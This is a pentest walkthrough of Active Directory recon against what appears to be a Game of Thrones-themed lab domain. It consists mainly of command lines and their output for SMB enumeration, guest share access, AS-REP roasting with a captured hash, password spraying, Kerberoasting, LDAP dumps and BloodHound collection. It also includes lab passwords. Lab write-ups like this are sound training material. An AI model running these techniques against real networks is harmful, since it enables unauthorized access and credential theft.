# Recon

## Network Enumeration

```console
$ netexec smb 10.10.10.0/24
SMB         10.10.10.22     445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         10.10.10.12     445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         10.10.10.11     445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         10.10.10.10     445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         10.10.10.23     445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
```

## Domain Controller IP Enumeration

From the domain name obtain previously, perform DNS lookup with the query `_ldap._tcp.dc._msdcs.domain.name` against the list of IP addresses.
Based on the output below, `KINGSLANDING`, `WINTERFELL`, and `MEEREEN` could potentially be the domain controllers.

```console
$ DOMAIN_NAME=sevenkingdoms.local

$ cat hosts.txt
10.10.10.10
10.10.10.11
10.10.10.12
10.10.10.22
10.10.10.23

$ cat hosts.txt | xargs -I{} -n1 nslookup -type=srv _ldap._tcp.dc._msdcs.${DOMAIN_NAME} {}
Server:         10.10.10.10
Address:        10.10.10.10#53

_ldap._tcp.dc._msdcs.sevenkingdoms.local        service = 0 100 389 kingslanding.sevenkingdoms.local.

Server:         10.10.10.11
Address:        10.10.10.11#53

_ldap._tcp.dc._msdcs.sevenkingdoms.local        service = 0 100 389 kingslanding.sevenkingdoms.local.

Server:         10.10.10.12
Address:        10.10.10.12#53

Non-authoritative answer:
_ldap._tcp.dc._msdcs.sevenkingdoms.local        service = 0 100 389 kingslanding.sevenkingdoms.local.

Authoritative answers can be found from:
kingslanding.sevenkingdoms.local        internet address = 10.10.10.10

;; communications error to 10.10.10.22#53: connection refused
;; communications error to 10.10.10.22#53: timed out
;; communications error to 10.10.10.22#53: connection refused
;; no servers could be reached


;; communications error to 10.10.10.23#53: connection refused
;; communications error to 10.10.10.23#53: timed out
;; communications error to 10.10.10.23#53: connection refused
;; no servers could be reached
```

## Users Enumeration (Unauthenticated)

### Anonymous (RARE)

```console
$ nxc smb 10.10.10.11 --users
SMB         10.10.10.11     445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         10.10.10.11     445    WINTERFELL       [*] Trying to dump local users with SAMRPC protocol
SMB         10.10.10.11     445    WINTERFELL       [+] Enumerated domain user(s)
SMB         10.10.10.11     445    WINTERFELL       north.sevenkingdoms.local\Guest                          Built-in account for guest access to the computer/domain
SMB         10.10.10.11     445    WINTERFELL       north.sevenkingdoms.local\arya.stark                     Arya Stark
SMB         10.10.10.11     445    WINTERFELL       north.sevenkingdoms.local\sansa.stark                    Sansa Stark
SMB         10.10.10.11     445    WINTERFELL       north.sevenkingdoms.local\brandon.stark                  Brandon Stark
SMB         10.10.10.11     445    WINTERFELL       north.sevenkingdoms.local\rickon.stark                   Rickon Stark
SMB         10.10.10.11     445    WINTERFELL       north.sevenkingdoms.local\hodor                          Brainless Giant
SMB         10.10.10.11     445    WINTERFELL       north.sevenkingdoms.local\jon.snow                       Jon Snow
SMB         10.10.10.11     445    WINTERFELL       north.sevenkingdoms.local\samwell.tarly                  Samwell Tarly (Password : Heartsbane)
SMB         10.10.10.11     445    WINTERFELL       north.sevenkingdoms.local\jeor.mormont                   Jeor Mormont
SMB         10.10.10.11     445    WINTERFELL       north.sevenkingdoms.local\sql_svc                        sql service

$ net rpc group members 'Domain Users' -W 'NORTH' -I '10.10.10.11' -U '%'
NORTH\Administrator
NORTH\vagrant
NORTH\krbtgt
NORTH\SEVENKINGDOMS$
NORTH\arya.stark
NORTH\eddard.stark
NORTH\catelyn.stark
NORTH\robb.stark
NORTH\sansa.stark
NORTH\brandon.stark
NORTH\rickon.stark
NORTH\hodor
NORTH\jon.snow
NORTH\samwell.tarly
NORTH\jeor.mormont
NORTH\sql_svc

$ enum4linux -a 10.10.10.11
```

### Anonymously w/o Anonymous Session

```console
$ nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='sevenkingdoms.local',userdb=wordlists.txt" 10.10.10.10
```

## Guest Share Access

```console
$ nxc smb 10.10.10.10-23 -u 'a' -p '' --shares
SMB         10.10.10.10     445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         10.10.10.11     445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         10.10.10.12     445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         10.10.10.23     445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         10.10.10.22     445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         10.10.10.10     445    KINGSLANDING     [-] sevenkingdoms.local\a: STATUS_LOGON_FAILURE
SMB         10.10.10.11     445    WINTERFELL       [-] north.sevenkingdoms.local\a: STATUS_LOGON_FAILURE
SMB         10.10.10.12     445    MEEREEN          [-] essos.local\a: STATUS_LOGON_FAILURE
SMB         10.10.10.23     445    BRAAVOS          [+] essos.local\a:
SMB         10.10.10.22     445    CASTELBLACK      [+] north.sevenkingdoms.local\a:
SMB         10.10.10.23     445    BRAAVOS          [*] Enumerated shares
SMB         10.10.10.23     445    BRAAVOS          Share           Permissions     Remark
SMB         10.10.10.23     445    BRAAVOS          -----           -----------     ------
SMB         10.10.10.23     445    BRAAVOS          ADMIN$                          Remote Admin
SMB         10.10.10.23     445    BRAAVOS          all             READ,WRITE      Basic RW share for all
SMB         10.10.10.23     445    BRAAVOS          C$                              Default share
SMB         10.10.10.23     445    BRAAVOS          CertEnroll                      Active Directory Certificate Services share
SMB         10.10.10.23     445    BRAAVOS          IPC$                            Remote IPC
SMB         10.10.10.23     445    BRAAVOS          public                          Basic Read share for all domain users
SMB         10.10.10.22     445    CASTELBLACK      [*] Enumerated shares
SMB         10.10.10.22     445    CASTELBLACK      Share           Permissions     Remark
SMB         10.10.10.22     445    CASTELBLACK      -----           -----------     ------
SMB         10.10.10.22     445    CASTELBLACK      ADMIN$                          Remote Admin
SMB         10.10.10.22     445    CASTELBLACK      all             READ,WRITE      Basic RW share for all
SMB         10.10.10.22     445    CASTELBLACK      C$                              Default share
SMB         10.10.10.22     445    CASTELBLACK      IPC$            READ            Remote IPC
SMB         10.10.10.22     445    CASTELBLACK      public                          Basic Read share for all domain users
```

## Known Users w/o Password

### AS-REP Roasting

```console
$ GetNPUsers.py north.sevenkingdoms.local/ -no-pass -usersfile north_users.txt
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User arya.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User eddard.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User catelyn.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robb.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sansa.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$brandon.stark@NORTH.SEVENKINGDOMS.LOCAL:f8028e46ca48cc63a26c94cdee596e2f$0a45c573a3a882743451f7c340f160c4e612d2cac2d6f8000ee938c88bf67c09cb2be33bffa9fea792a4bda8c3a7eac61d73cb7c4049a3481a272fb7b7d66e96cbd284803902af41810d0ea1e832088cd8912863268421031efbfc3f659d2113376e2984f71eab683e62b22e33e46837e3823d764f4529ceb61c926906225e98b66934bb5c061cc5289f9f31d606a1bf7b6484e042c4905e2a6245be26b63f99d4c4030b16c7eeeaa170ee35eadc6e51d9a420d9456160d5648b67438b2edf458633c6678d4577cbc1527927d01de91b17e92c62ec6f45258d2a876afeb509659218728b2dab396065b854cba0c176cd02e7ec8238935b57344e6b61e7a7679716636b514374
[-] User rickon.stark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User hodor doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jon.snow doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User samwell.tarly doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jeor.mormont doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sql_svc doesn't have UF_DONT_REQUIRE_PREAUTH set

$ hashcat -h | grep -i as-rep
  18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol

$ hashcat -m 18200 brandon.stark.asrep.hash /usr/share/wordlists/rockyou.txt
```

### Password Spraying

Spray for accounts whose password is the same as the username

```
$ nxc smb 10.10.10.11 -u north_users.txt -p north_users.txt --no-bruteforce --continue-on-success
SMB         10.10.10.11     445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         10.10.10.11     445    WINTERFELL       [-] north.sevenkingdoms.local\Administrator:Administrator STATUS_LOGON_FAILURE
SMB         10.10.10.11     445    WINTERFELL       [-] north.sevenkingdoms.local\krbtgt:krbtgt STATUS_LOGON_FAILURE
SMB         10.10.10.11     445    WINTERFELL       [-] north.sevenkingdoms.local\arya.stark:arya.stark STATUS_LOGON_FAILURE
SMB         10.10.10.11     445    WINTERFELL       [-] north.sevenkingdoms.local\eddard.stark:eddard.stark STATUS_LOGON_FAILURE
SMB         10.10.10.11     445    WINTERFELL       [-] north.sevenkingdoms.local\catelyn.stark:catelyn.stark STATUS_LOGON_FAILURE
SMB         10.10.10.11     445    WINTERFELL       [-] north.sevenkingdoms.local\robb.stark:robb.stark STATUS_LOGON_FAILURE
SMB         10.10.10.11     445    WINTERFELL       [-] north.sevenkingdoms.local\sansa.stark:sansa.stark STATUS_LOGON_FAILURE
SMB         10.10.10.11     445    WINTERFELL       [-] north.sevenkingdoms.local\brandon.stark:brandon.stark STATUS_LOGON_FAILURE
SMB         10.10.10.11     445    WINTERFELL       [-] north.sevenkingdoms.local\rickon.stark:rickon.stark STATUS_LOGON_FAILURE
SMB         10.10.10.11     445    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor
SMB         10.10.10.11     445    WINTERFELL       [-] north.sevenkingdoms.local\jon.snow:jon.snow STATUS_LOGON_FAILURE
SMB         10.10.10.11     445    WINTERFELL       [-] north.sevenkingdoms.local\samwell.tarly:samwell.tarly STATUS_LOGON_FAILURE
SMB         10.10.10.11     445    WINTERFELL       [-] north.sevenkingdoms.local\jeor.mormont:jeor.mormont STATUS_LOGON_FAILURE
SMB         10.10.10.11     445    WINTERFELL       [-] north.sevenkingdoms.local\sql_svc:sql_svc STATUS_LOGON_FAILURE
```

## Users Enumeration (Authenticated)

### Impacket

```console
$ GetADUsers.py -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Querying north.sevenkingdoms.local for information about domain.
Name                  Email                           PasswordLastSet      LastLogon
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2024-01-09 17:07:16.678154  2024-01-09 18:07:02.533281
Guest                                                 <never>              <never>
vagrant                                               2024-01-09 13:25:06.835919  2024-01-09 18:35:26.103058
krbtgt                                                2024-01-09 17:24:15.284257  <never>
                                                      2024-01-09 17:34:17.918667  <never>
arya.stark                                            2024-01-09 17:43:40.414804  2024-01-10 09:53:55.608288
eddard.stark                                          2024-01-09 17:43:47.777170  2024-01-10 10:25:10.683311
catelyn.stark                                         2024-01-09 17:43:54.636543  <never>
robb.stark                                            2024-01-09 17:44:01.270374  2024-01-10 10:27:22.925009
sansa.stark                                           2024-01-09 17:44:07.239856  <never>
brandon.stark                                         2024-01-09 17:44:11.552905  2024-01-10 10:28:15.741418
rickon.stark                                          2024-01-09 17:44:17.006005  <never>
hodor                                                 2024-01-09 17:44:22.131007  <never>
jon.snow                                              2024-01-09 17:44:26.850581  <never>
samwell.tarly                                         2024-01-09 17:44:32.116183  2024-01-10 10:24:54.723185
jeor.mormont                                          2024-01-09 17:44:36.892611  <never>
sql_svc                                               2024-01-09 17:44:40.892597  2024-01-09 18:26:58.563838
```

### LDAP

[Cheatsheet](https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/)

```sh
ldapsearch -H ldap://10.10.10.11 -D 'hodor@north.sevenkingdoms.local' -w 'hodor' -b 'DC=north,DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" | grep 'distinguished' | awk -F "CN=" '{print $2}' | cut -d ',' -f1
ldapsearch -H ldap://10.10.10.10 -D 'hodor@north.sevenkingdoms.local' -w 'hodor' -b 'DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" | grep 'distinguished' | awk -F "CN=" '{print $2}' | cut -d ',' -f1
```

Using [ldeep](https://github.com/franc-pentest/ldeep)

```sh
ldeep ldap -u hodor -p hodor -d north.sevenkingdoms.local -s ldap://10.10.10.11 all north
ldeep ldap -u hodor -p hodor -d north.sevenkingdoms.local -s ldap://10.10.10.10 all sevenkingdoms
ldeep ldap -u hodor -p hodor -d north.sevenkingdoms.local -s ldap://10.10.10.12 all essos
```

## Kerberoasting

```sh
GetUserSPNs.py -request -dc-ip 10.10.10.11 north.sevenkingdoms.local/hodor:hodor
hashcat krb.hashes /usr/share/wordlists/rockyou.txt
```

## Share Enumeration (Authenticated)

```sh
nxc smb 10.10.10.10-23 -u jon.snow -p iknownothing -d north.sevenkingdoms.local --shares
```

## Bloodhound

```console
C:\Users\jon.snow> .\SharpHound.exe -d north.sevenkingdoms.local -c all --zipfilename bh_north_sevenkingdoms.zip
C:\Users\jon.snow> .\SharpHound.exe -d sevenkingdoms.local -c all --zipfilename bh_sevenkingdoms.zip
C:\Users\jon.snow> .\SharpHound.exe -d essos.local -c all --zipfilename bh_essos.zip
```

